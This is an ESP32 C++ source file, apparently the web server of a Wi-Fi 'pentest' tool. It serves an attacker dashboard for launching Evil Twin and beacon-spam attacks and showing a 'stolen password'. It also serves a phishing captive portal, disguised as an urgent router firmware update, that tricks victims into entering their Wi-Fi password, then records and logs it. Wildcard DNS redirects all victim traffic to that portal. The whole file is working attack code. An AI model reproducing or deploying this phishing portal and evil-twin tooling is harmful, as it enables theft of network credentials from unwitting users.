#include "web_server.h"
#include "attacks.h"
#include <WebServer.h>
#include <DNSServer.h>
#include <WiFi.h>

WebServer server(80);
DNSServer dnsServer;
String stolen_password = "None";
bool attack_active = false;

const char* dashboard_html = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>ESP32 Pentest Dashboard</title>
<style>
body{font-family:sans-serif;background:#1e1e1e;color:#fff;text-align:center;padding:20px;}
h1{color:#00ffcc;} .card{background:#2a2a2a;padding:20px;border-radius:10px;max-width:500px;margin:20px auto;}
input{padding:10px;border-radius:5px;border:none;margin:5px;width:80%;}
button{padding:10px 20px;border-radius:5px;border:none;cursor:pointer;font-weight:bold;margin:5px;}
.btn-red{background:#ff4444;color:white;} .btn-blue{background:#4444ff;color:white;} .btn-green{background:#44aa44;color:white;}
</style></head><body>
<h1>ESP32 Pentest Tools</h1>

<div class="card">
    <h3>1. Evil Twin</h3>
    <input type="text" id="ssid" placeholder="Target SSID">
    <input type="text" id="bssid" placeholder="BSSID (AA:BB:CC:DD:EE:FF)">
    <input type="number" id="channel" placeholder="Channel">
    <br><button class="btn-red" onclick="startEvilTwin()">Start Evil Twin</button>
</div>

<div class="card">
    <h3>2. Beacon Spam</h3>
    <input type="text" id="spam_name" placeholder="Base Name">
    <input type="number" id="spam_count" placeholder="Count">
    <br><button class="btn-blue" onclick="startSpam()">Start Spam</button>
</div>

<div class="card">
    <h3>3. Stop All</h3>
    <button class="btn-green" onclick="stopAll()">Stop</button>
</div>

<div class="card">
    <h3>Stolen Password</h3>
    <h2 style="color:#ffcc00;" id="stolen_pass">Loading...</h2>
</div>

<script>
function startEvilTwin() { let ssid = document.getElementById('ssid').value; let bssid = document.getElementById('bssid').value; let ch = document.getElementById('channel').value; fetch('/start_eviltwin?ssid='+ssid+'&bssid='+bssid+'&ch='+ch); }
function startSpam() { let name = document.getElementById('spam_name').value; let count = document.getElementById('spam_count').value; fetch('/start_spam?name='+name+'&count='+count); }
function stopAll() { fetch('/stop'); }
setInterval(()=>{ fetch('/get_pass').then(r=>r.text()).then(t=>document.getElementById('stolen_pass').innerText=t); }, 2000);
</script></body></html>
)rawliteral";

const char* portal_html = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Router Update</title>
<style>
body{font-family:sans-serif;background:#f4f6f8;color:#333;text-align:center;padding:50px;}
.card{background:#fff;padding:30px;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,0.1);max-width:400px;margin:auto;}
h1{color:#d9534f;} input{padding:12px;width:80%;margin:10px;border:1px solid #ccc;border-radius:5px;}
button{background:#1a56db;color:white;padding:12px 20px;border:none;border-radius:5px;width:88%;cursor:pointer;font-size:16px;}
.progress{width:100%;height:5px;background:#e2e8f0;margin-bottom:20px;border-radius:3px;}
.progress-bar{width:0%;height:100%;background:#1a56db;transition:width 0.5s;}
</style></head><body>
<div class="card">
    <h1>⚠️ Firmware Update Required</h1>
    <div class="progress"><div class="progress-bar" id="bar"></div></div>
    <p>A critical security vulnerability was found in your router. Enter your Wi-Fi password to authorize the update.</p>
    <form action="/submit_password" method="GET">
        <input type="password" name="password" placeholder="Enter Wi-Fi Password" required>
        <button type="submit">Update Router</button>
    </form>
</div>
<script>
let p=0; setInterval(()=>{ if(p<100){p+=5; document.getElementById('bar').style.width=p+'%';} },500);
</script></body></html>
)rawliteral";

void handleRoot() { server.send(200, "text/html", dashboard_html); }
void handlePortal() { server.send(200, "text/html", portal_html); }

void handleSubmitPassword() {
    if (server.hasArg("password")) {
        stolen_password = server.arg("password");
        Serial.print("Stolen Password: ");
        Serial.println(stolen_password);
    }
    server.send(200, "text/html", "<h1>Thank you! Router Updated.</h1>");
}

void handleStartEvilTwin() {
    if (server.hasArg("ssid") && server.hasArg("bssid") && server.hasArg("ch")) {
        String ssid = server.arg("ssid");
        String bssidStr = server.arg("bssid");
        int ch = server.arg("ch").toInt();
        uint8_t bssid[6];
        sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
        startEvilTwin(ssid, bssid, ch);
        attack_active = true;
        server.send(200, "text/plain", "Evil Twin Started");
    } else {
        server.send(400, "text/plain", "Missing Parameters");
    }
}

void handleStartSpam() {
    if (server.hasArg("name") && server.hasArg("count")) {
        String name = server.arg("name");
        int count = server.arg("count").toInt();
        startBeaconSpam(name, count);
        server.send(200, "text/plain", "Beacon Spam Started");
    } else {
        server.send(400, "text/plain", "Missing Parameters");
    }
}

void handleStop() {
    stopAllAttacks();
    attack_active = false;
    server.send(200, "text/plain", "All Attacks Stopped");
}

void handleGetPass() {
    server.send(200, "text/plain", stolen_password);
}

void handleNotFound() {
    if (attack_active) {
        server.sendHeader("Location", "/portal", true);
        server.send(302, "text/plain", "");
    } else {
        server.send(404, "text/plain", "Not Found");
    }
}

void initWebServer() {
    dnsServer.start(53, "*", WiFi.softAPIP());
    server.on("/", handleRoot);
    server.on("/portal", handlePortal);
    server.on("/submit_password", handleSubmitPassword);
    server.on("/start_eviltwin", handleStartEvilTwin);
    server.on("/start_spam", handleStartSpam);
    server.on("/stop", handleStop);
    server.on("/get_pass", handleGetPass); // مسار جديد لجلب كلمة المرور
    server.onNotFound(handleNotFound);
    server.begin();
    Serial.println("Web Server Started");
}

void handleWebServer() {
    dnsServer.processNextRequest();
    server.handleClient();
}
